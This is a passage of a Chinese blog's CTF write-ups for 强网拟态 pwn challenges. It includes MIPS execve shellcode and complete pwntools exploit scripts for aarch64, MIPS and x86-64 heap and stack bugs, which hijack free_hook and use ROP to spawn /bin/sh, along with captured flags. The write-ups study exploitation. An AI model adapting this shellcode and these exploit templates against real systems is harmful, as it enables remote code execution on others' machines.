t9\n```\n\n如下寻址指令\n\n```python\nmipsrop.find(\"move $t9, $s3\")\n```\n\n因为一般上基本不存在直接取栈地址然后跳转的，所以需要多重跳转来完成。\n\n\n\n## 🔺可用shellcode:\n\n### (1)直接可用的\n\n```python\nshellcode = b\"\"\nshellcode += b\"\\xff\\xff\\x06\\x28\"  # slti $a2, $zero, -1\nshellcode += b\"\\x62\\x69\\x0f\\x3c\"  # lui $t7, 0x6962         ib\nshellcode += b\"\\x2f\\x2f\\xef\\x35\"  # ori $t7, $t7, 0x2f2f    ib//\nshellcode += b\"\\xf4\\xff\\xaf\\xaf\"  # sw $t7, -0xc($sp)      \nshellcode += b\"\\x73\\x68\\x0e\\x3c\"  # lui $t6, 0x6873         hs\nshellcode += b\"\\x6e\\x2f\\xce\\x35\"  # ori $t6, $t6, 0x2f6e    hs/n\nshellcode += b\"\\xf8\\xff\\xae\\xaf\"  # sw $t6, -8($sp)\nshellcode += b\"\\xfc\\xff\\xa0\\xaf\"  # sw $zero, -4($sp)\nshellcode += b\"\\xf4\\xff\\xa4\\x27\"  # addiu $a0, $sp, -0xc   //bin/sh\nshellcode += b\"\\xff\\xff\\x05\\x28\"  # slti $a1, $zero, -1\nshellcode += b\"\\xab\\x0f\\x02\\x24\"  # addiu $v0, $zero, 0xfab\nshellcode += b\"\\x0c\\x01\\x01\\x01\"  # syscall 0x40404\n```\n\n\n\n### (2)从栈上取数据的：\n\n```python\nshellcode1 = \"\\x1c\\xfe\\xa4\\x8f\" + \\\n    \"\\x20\\x28\\x40\\x02\" + \\\n    \"\\x20\\x30\\x40\\x02\" + \\\n    \"\\x28\\xfe\\xa2\\x8f\" + \\\n    \"\\x0c\\x01\\x01\\x01\"\n```\n\n对应的如下汇编代码：\n\n```bash\nrasm2 -a mips -b 32 -C \"lw a0,-0x1e4(sp)\" \t#a\nrasm2 -a mips -b 32 -C \"move a1,s2\"\t\t\t#a1\nrasm2 -a mips -b 32 -C \"move a2,s2\"\t\t\t#a2\nrasm2 -a mips -b 32 -C \"lw v0,-0x1d8(sp)\"\t#v0\nrasm2 -a mips -b 32 -C \"syscall\"\t\t\t#syscall\n```\n\n\n\n## 6.调试\n\n```\nset architecture mips\nset endian little\nsymbol-file ./Mplogin\ntarget remote 127.0.0.1:12345\n```\n\n\n\n\n\n\n\n# 下载库\n\n异构下载库\n\n```\napt install crossbuild-essential-*\napt install qemu-user\n```\n\n","tags":["异构"],"categories":["PWN","异构"]},{"title":"强网决赛拟态WP","url":"/2021/10/26/强网拟态决赛WP/","content":"\n白盒黑盒啥的我一点都不会，只会做点CTF然后给大佬们加油！那些什么简单题就不说了，总结一下比较有意思的。\n\n# 一、oneaarch\n\n这是个aarch架构的简单堆溢出的题，由于做的时候，本地环境没有搭的太好，也不太会在PIE的时候断点调试，直接就是盲堆，所以花了挺长时间。\n\n另外还说一点的就是本题的设计还不错，是通过字节来进行堆的布置的，也就是只能发送一次数据，然后依据这里面的数据来进行堆的申请与释放，不符合规则的就无法正确操作。如果把这个思路用在x86_64的架构下，那么很多需要泄露地址的堆题直接就没办法做了，还是很有意思的。\n\n但是这里由于qemu模拟的关系，在PIE的条件下，无论启动多少次，程序的基地址还是不变的，相当于是个简单版的PIE+ASLR。而在这题里，由于只能发送一次payload，所以这里我们可以先泄露地址，然后再进行getshell。\n\n## 1.泄露地址\n\n利用堆溢出修改size进入Unsortedbin泄露地址即可\n\n```python\nadd(0,0xf8)\nadd(1,0xf8)\nadd(2,0xf8)\nadd(3,0xf8)\nadd(4,0xf8)\nadd(5,0xf8)\nadd(6,0xf8)\nedit(0,0xf8+2,'PIG007NB'*(0xf8/8)+p16(0x501))\n\ndelete(5)\ndelete(4)\ndelete(3)\ndelete(2)\ndelete(1)\n\nadd(1,0x78)\nadd(2,0x78)\nadd(3,0x78)\np.recv()\nsleep(1)\nedit(1,0x8,\"B\"*8)\nshow(1)\n\nru('B'*8)\nleak = uu32(rc(3))\nlibc_base = leak- 0x000658 - libc.sym['_IO_2_1_stdin_']\nlg(\"libc_base\",libc_base)\n```\n\n这里泄露地址的时候需要注意一下aarch架构的libc加载的区别，一定是0x4000000000打头的。同时由\\x00的截断我们只能获取到后面的几个不是\\x00的数据，那么得到数据之后减去偏移再加上0x4000000000即可。\n\n## 2.getshell\n\n这里就直接贴总的wp了，也就是正常的溢出加劫持fd为free_hook，打free_hook即可。\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\nimport struct\nimport os\n\n#context\n#context.arch = 'amd64'\n#SigreturnFrame(kernel = 'amd64')\n\n#context.log_level = 'debug'\ncontext(arch='aarch64')\n#context(arch='arm')\n\n\nbinary = \"./pwn\"\nlocalPort = \"12345\"\narch = \"qemu-aarch64\"\n#arch = \"qemu-arm\"\nlinkLibrary = \"/home/hacker/glibc/2.31/aarch\"\n#linkLibrary = \"/home/hacker/glibc/2.27/arm\"\n\n#libc = ELF(\"/home/hacker/glibc/2.31/arm/lib/libc.so.6\")\n#libc = ELF(\"/home/hacker/glibc/2.31/aarch/lib/libc.so.6\")\nlibc = ELF(\"./libc-2.31.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xff\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n\n\nglobal chunkPayload\n\nremote_debug=0\nremoteFlag=1\nlocal=0\nif remote_debug==1:\n    p = process([arch, '-L', linkLibrary, '-g', localPort, binary])\n    #p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', '-g', '1234', binary],env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\nelif local==1:\n    p = process([arch, '-L', linkLibrary, binary])\n    elf = ELF(binary)\nelif remoteFlag==1:\n    p = remote(\"172.35.30.11\",\"9999\")\n\ndef add(idx,size):\n    global chunkPayload\n    chunkPayload += '\\x01'\n    chunkPayload += p8(idx)\n    chunkPayload += p16(size)\n\ndef delete(idx):\n    global chunkPayload\n    chunkPayload += '\\x02'\n    chunkPayload += p8(idx)\n\ndef show(idx):\n    global chunkPayload\n    chunkPayload += '\\x03'\n    chunkPayload += p8(idx)\n\ndef edit(idx,size,con):\n    global chunkPayload\n    chunkPayload += '\\x04'\n    chunkPayload += p8(idx)\n    chunkPayload += p16(size)\n    chunkPayload += con\n\n\ndef mulArchDbg():\n    os.system(\"gnome-terminal -- bash -c \\\"gdb-multiarch -q {0} \\\n        --eval-command='target remote localhost:{1}'\\\"\".format(binary,localPort))\n    pause()\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\nchunkPayload = \"\"\n#pause()\n#mulArchDbg()\n#pause()\np.recv()\n\nremote_libc_base = 0x848000\nlocal_libc_base = 0x845000\nfree_hook = remote_libc_base + libc.sym['__free_hook']\n_IO_2_1_stdout = remote_libc_base + libc.sym['_IO_2_1_stdout_']\nsystem = remote_libc_base + libc.sym['system']\nlg(\"remote_libc_base\",remote_libc_base)\nlg(\"free_hook\",free_hook)\nlg(\"system\",system)\n#pause()\nadd(0,0xf8)\nadd(1,0xf8)\nadd(2,0xf8)\nadd(3,0xf8)\nadd(4,0xf8)\nadd(5,0xf8)\nadd(6,0xf8)\nedit(0,0xf8+2,'PIG007NB'*(0xf8/8)+p16(0x501))\n\ndelete(5)\ndelete(4)\ndelete(3)\ndelete(2)\ndelete(1)\n\nadd(1,0x78)\nadd(2,0x78)\nadd(3,0x78)\n\n# p.recv()\n\n# sleep(1)\n\n# edit(1,0x8,\"B\"*8)\n\n# show(1)\n\n#edit(3,0x3,p16(free_hook&0xffff)+p8(free_hook>>16))\n\n# show(1)\n\nedit(3,0x8,p64(0x4000000000+free_hook))\n\n# show(1)\n\nadd(7,0xf8)\n#show(7)\nadd(8,0xf8)\n#show(8)\n#edit(8,0x3,p16(system&0xffff)+p8(system>>16))\nedit(8,0x8,p64(0x4000000000+system))\n\n# show(8)\n\n#edit(8,0x3,p16(system&0xffff)+p8(system>>16))\nedit(0,8,'/bin/sh\\x00')\ndelete(0)\n\n\np.send(chunkPayload)\n\n# ru('B'*8)\n\n# leak = uu32(rc(3))\n\n# libc_base = leak- 0x000658 - libc.sym['_IO_2_1_stdin_']\n\n# lg(\"libc_base\",libc_base)\n\nsleep(1)\np.recv()\npause()\np.interactive()\n\n#flag{030fa6cc-ba7d-4b35-a847-a690953e2270}\n```\n\n# 二、eserver\n\n这题是mips架构的pwn题，由于没有接触过，当时直接现学了一波，后面再把所有架构的pwn题整个汇总把。\n\n栈溢出题，没开canary和NX，按理说应该可以返回到栈上直接执行shellcode。那么本地直接依照调试获取栈地址返回栈上进行shellcode，但是远程的时候需要爆破一下栈地址，也不会太多，因为PIE基本等于不存在，栈地址的起始位置大概率就是0x7ffxx000，应该只需要爆破xx这一个字节，有时候通常也是0x7ffex000，也就是半个字节即可。\n\n此外说一下调试，怕以后忘了。由于开启了PIE，如果直接qemu模拟的话，很难确定函数的位置，不好下断点，所以这里讲一个比较常用到的方法。\n\n## 调试\n\n由于qemu和开启PIE的mips架构的特性，貌似在栈下面就是共享库的加载地址，这个做了好多实验，都是这样的，不知道为啥，应该是mips架构下开启PIE之后，文件会变成共享库的格式：\n\n![image-20211115215721252](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215721.png)\n\n再依据共享库加载的特性吧。\n\n所以这里我们直接就能通过`add-symbol-file File text_addr`的形式来确定地址。\n\n![image-20211115215604777](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215611.png)\n\n这里红箭头指向的地方应该就是我们的开启PIE之后的文件加载地址，之后添加即可。\n\n![image-20211115215845957](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215846.png)\n\n这样在输入函数打印，即可确定\n\n![image-20211115215959158](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115215959.png)\n\n得到如下结果，这样就能方便调试了。\n\n![image-20211115220009365](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115220009.png)\n\n所以这里应该是有两种方法的\n\n## 1.通过爆破栈进行shellcode利用\n\n### (1)编写shellcode\n\n这里讲一下shellcode的编写\n\n#### ①通过栈寄存器sp来取值编写\n\n利用lw指令，通过sp寄存器来从栈上取值赋给对应的参数寄存器，最终效果如下：\n\n![image-20211115233439670](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115233439.png)\n\n对应的汇编生成：\n\n```bash\nrasm2 -a mips -b 32 -C \"lw a0,-0x1e4(sp)\" \t#a\nrasm2 -a mips -b 32 -C \"move a1,s2\"\t\t\t#a1\nrasm2 -a mips -b 32 -C \"move a2,s2\"\t\t\t#a2\nrasm2 -a mips -b 32 -C \"lw v0,-0x1d8(sp)\"\t#v0\nrasm2 -a mips -b 32 -C \"syscall\"\t\t\t#syscall\n```\n\n由于\\x00的截断，所以这里选取在sp之前的数据进行获取，其实由于循环的关系，这里也可以通过重复发送数据来将\\x00给输入进来，之后发送/bin/sh\\x00以及syscall的时候就是用到这个的。\n\n#### ②利用其他寄存器\n\n同理，由于elf_base不变，所以可以通过寄存器减去偏移获取存在bss段上的数据，一样设置，比如下图的a1和s1寄存器。\n\n![image-20211115234634536](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115234634.png)\n\n如下的exp\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\nimport struct\nimport os\n\n#context\n#context.arch = 'amd64'\nSigreturnFrame(kernel = 'mips')\n\n#context.log_level = 'debug'\ncontext(arch='mips')\n#context(arch='arm')\n\n\nbinary = \"./mipselNormal\"\nlocalPort = \"12345\"\nversion = \"2.23\"\narch = \"mipsel\"\nqemu_arch = \"qemu-{0}\".format(arch)\nlinkLibrary = \"/home/hacker/glibc/{0}/{1}\".format(version,arch)\nlibc = ELF(linkLibrary+\"/lib/libc-{0}.so\".format(version))\n#libc = ELF(\"./libc-2.31.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xff\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nglobal p\n\n\nremote_debug=1\nremoteFlag=0\nlocal=0\nif remote_debug==1:\n    p = process([arch, '-L', linkLibrary, '-g', localPort, binary])\n    #p = process([arch,'-g',localPort,binary])\n    #p = process([arch, '-L', '.', '-g', localPort, binary])\n    elf = ELF(binary)\nelif local==1:\n    p = process([arch, '-L', linkLibrary, binary])\n    elf = ELF(binary)\nelif remoteFlag==1:\n    p = remote(\"172.35.30.12\",\"9999\")\n\n\ndef mulArchDbg():\n    os.system(\"gnome-terminal -- bash -c \\\"gdb-multiarch -q {0} \\\n        --eval-command='target remote localhost:{1}'\\\"\".format(binary,localPort))\n    pause()\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\ndef send_package(content):\n    p.recvuntil(\"Input package:\")\n    p.sendline(content)\n\ndef pwn():\n    global p\n\n    elf_base = 0x7ffed000\n    sp = elf_base - 0x1160\n    #sp = 0x7ffebea0\n    #mulArchDbg()\n    binsh_addr = sp-0x200+0x8 + 20 + 0x4\n    shellcode_addr = sp-0x200+0x8\n    binsh0 = '/bin/sh\\x00'\n    binsh1 = '/bin/sh\\x11'\n    lg(\"sp\",sp)\n    lg(\"binsh_addr\",binsh_addr)\n    lg(\"shellcode_addr\",shellcode_addr)\n    data0_1 = '\\xab\\x0f\\xaa'\n    data0_2 = '\\xab\\x0f'\n    data1 = '\\xab\\x0f'.ljust(4,'B')\n    data_addr = binsh_addr + 0x8\n    lg(\"data_addr\",data_addr)\n    #path(v0),argv(a1),env(a2),unistd_execv(v0)\n    shellcode1 = \"\\x1c\\xfe\\xa4\\x8f\" + \\\n        \"\\x20\\x28\\x40\\x02\" + \\\n        \"\\x20\\x30\\x40\\x02\" + \\\n        \"\\x28\\xfe\\xa2\\x8f\" + \\\n        \"\\x0c\\x01\\x01\\x01\"\n    shellcode0_1 = \"\\x1c\\xfe\\xa4\\x8f\" + \\\n        \"\\x20\\x28\\x40\\x02\" + \\\n        \"\\x20\\x30\\x40\\x02\" + \\\n        \"\\x28\\xfe\\xa2\\x8f\" + \\\n        \"\\x0c\\x11\\x11\\x00\"\n    shellcode0_2 = \"\\x1c\\xfe\\xa4\\x8f\" + \\\n        \"\\x20\\x28\\x40\\x02\" + \\\n        \"\\x20\\x30\\x40\\x02\" + \\\n        \"\\x28\\xfe\\xa2\\x8f\" + \\\n        \"\\x0c\\x11\\x00\\x00\"\n    shellcode0_3 = \"\\x1c\\xfe\\xa4\\x8f\" + \\\n        \"\\x20\\x28\\x40\\x02\" + \\\n        \"\\x20\\x30\\x40\\x02\" + \\\n        \"\\x28\\xfe\\xa2\\x8f\" + \\\n        \"\\x0c\\x00\\x00\\x00\"\n    #shellcode = asm(shellcraft.sh())\n    #path(a0)\n    #p.sendline(\"EXIT\")\n    p.sendline((\"A\"*8 + shellcode1 + p32(binsh_addr) + binsh1 + data1).ljust(0x1f8+4,\"C\") + p32(shellcode_addr))\n    p.sendline((\"A\"*8 + shellcode1 + p32(binsh_addr) + binsh1 + data0_1))\n    p.sendline((\"A\"*8 + shellcode1 + p32(binsh_addr) + binsh1 + data0_2))\n    p.sendline((\"A\"*8 + shellcode1 + p32(binsh_addr) + binsh0 + data0_2))\n    p.sendline((\"A\"*8 + shellcode0_1))\n    p.sendline((\"A\"*8 + shellcode0_2))\n    p.sendline((\"A\"*8 + shellcode0_3))\n    p.sendline(\"EXIT\")\n    p.interactive()\n\npwn()\n```\n\n然后加个爆破脚本即可，爆破elf_base的地址，这里的sp是通过main函数返回之后进入shellcode的sp的地址。\n\n![image-20211115224101569](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211115224101.png)\n\n","tags":["强网决赛拟态WP"],"categories":["强网决赛拟态WP"]},{"title":"强网拟态WP","url":"/2021/10/26/强网拟态WP/","content":"\n总的来说这次强网拟态的PWN题都不算难，不过有几个点倒是挺有意思的。\n\n# 一、sonic\n\n泄露elf_base了，然后直接栈溢出，利用本身自带的gadget即可getshell。但是这里也有一个后门函数，之后才发现的，不知道为啥。`/usr/bin/cli`这个命令居然直接得到flag。\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./sonic\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"123.60.63.90\",6890)\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"your choice>>\"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\nru(\"main Address=0x\")\nelf_base = int(rc(12),16) -0x7cf\nbackdoor = elf_base+0x73A\nlg(\"elf_base\",elf_base)\n\npop_rdi_ret = 0x00000000000008c3\npop_rsi_r15_ret = 0x00000000000008c1\nusrname = 0x201040\nexecv = 0x610\n\npayload = \"\"\npayload += '/bin/sh\\x00'.ljust(0x28,'A')\npayload += p64(elf_base + pop_rdi_ret)\npayload += p64(elf_base + usrname)\npayload += p64(elf_base + pop_rsi_r15_ret)\npayload += p64(0)\npayload += p64(0)\npayload += p64(elf_base + execv)\n\n#dbg()\nsl(payload)\n#pause()\np.interactive()\n\n\n#flag{riCGJnvUieCXasPUUiAQ6XzWVdjFJTQB}\n```\n\n这里可以注意下execv这个函数，设置了rdi为`/bin/sh`之后还需要设置rsi为0才可getshell。\n\n\n\n# 二、bitflip\n\n这也是很常规，2.27的off by one，只能最大0x60的Chunk，可以直接改size大于0x80的fastbin，填满tcache之后释放进入Unsortedbin泄露地址，之后就常规改free_hook了。\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./bitflip\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"124.71.130.185\",\"49155\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\ndef add(idx,size):\n\tsla(menu,'1')\n\tsla('Index: ',str(idx))\n\tsla('Size: ',str(size))\ndef edit(idx,con):\n\tsla(menu,'2')\n\tsla('Index: ',str(idx))\n\tsla('Content: ',con)\ndef show(idx):\n\tsla(menu,'3')\n\tsla('Index: ',str(idx))\ndef delete(idx):\n\tsla(menu,'4')\n\tsla('Index: ',str(idx))\n\n\nfor i in range(8):\n \tadd(i,0x38)\n\nfor i in range(8,12):\n \tadd(i,0x38)\n\nfor i in range(8):\n \tedit(i,(0x38)*\"\\x11\"+'\\xe1')\n\nedit(11,\"\\x21\"*0x18+p64(0x21))\n\nfor i in range(8):\n \tdelete(i+1)\n\n\nadd(12,0x38)\nshow(12)\nlibc_base = u64Leakbase(304+0x10+libc.sym['__malloc_hook'])\n\n__free_hook_addr = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlg(\"libc_base\",libc_base)\nlg(\"__free_hook_addr\",__free_hook_addr)\nlg(\"system_addr\",system_addr)\n\nadd(13,0x38)\ndelete(10)\ndelete(13)\nedit(9,p64(__free_hook_addr))\nadd(14,0x38)\nadd(15,0x38)\nedit(15,p64(system_addr))\nedit(0,'/bin/sh\\x00')\ndelete(0)\nit()\n\n#flag{2296341872d87bd532c121d14d55c4ac}\n```\n\n# 三、old_school\n\n很常规，2.27的off by one，直接拿off by null的模板改了，其实用上面bitflip的模板也是一样的，改size。\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./old_school\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"121.36.194.21\",49155)\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\ndef add(idx,size):\n\tsla(menu, \"1\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Size: \", str(size))\n\ndef delete(idx):\n\tsla(menu, \"4\")\n\tsla(\"Index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"3\")\n\tsla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n\tsla(menu, \"2\")\n\tsla(\"Index: \", str(idx))\n\tsa(\"Content: \", con)\n\n\nfor i in range(0x7):\n\tadd(i,0xf8)\n\nfor i in range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\nadd(0x14,0xf8)\t#0x14\n\nadd(0x15,0x98)\t#0x15\nadd(0x16,0xe8)\t#0x16\nadd(0x17,0xe8)\t#0x17\nadd(0x18,0xf8)\t#0x18\nadd(0x19,0xf8)\t#0x19\nadd(0x1a,0xf8)\t#0x1a\n\nfor i in range(0x7):\n\tdelete(i)\nfor i in range(0x7,0x7+0x7):\n\tdelete(i)\n\ndelete(0x15)\n#prented off by null\nedit(0x18,'\\x33'*0xf0+p64(0x300+0xa0-0x10-0x10)+'\\x00'+'\\n')\ndelete(0x19)\n\nfor i in range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\nadd(0x1b,0x98)\nsleep(1)\nshow(0x1b)\nru(\"Content: \")\nlibc_base = u64Leakbase(0x3ec0b0)\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem = libc_base + libc.sym['system']\none = libc_base + 0x4f432\nlg(\"libc_base\",libc_base)\nlg(\"free_hook\",free_hook)\nlg(\"system\",system)\nsleep(1)\n\nadd(0x1c,0xe8)\nadd(0x1d,0xe8)\ndelete(0x1d)\ndelete(0x1c)\nedit(0x16,p64(free_hook)+'\\n')\nadd(0x1e,0xe8)\nadd(0x1f,0xe8)\nedit(0x1f,p64(system)+'\\n')\nedit(0x14,'/bin/sh\\x00'+\"A\"*0x10+'\\n')\ndelete(0x14)\nit()\n\n#flag{m0lWJAzDB1vzxMn9PlMQXkPvEmGAdZzB}\n```\n\n# 四、old_school_revenge\n\n刚好又出了个off by null，同样就是模板打\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./old_school_revenge\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"123.60.63.39\",49155)\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(idx,size):\n\tsla(menu, \"1\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Size: \", str(size))\n\ndef delete(idx):\n\tsla(menu, \"4\")\n\tsla(\"Index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"3\")\n\tsla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n\tsla(menu, \"2\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Content: \", con)\n\nfor i in range(0x7):\n\tadd(i,0xf8)\n\nfor i in 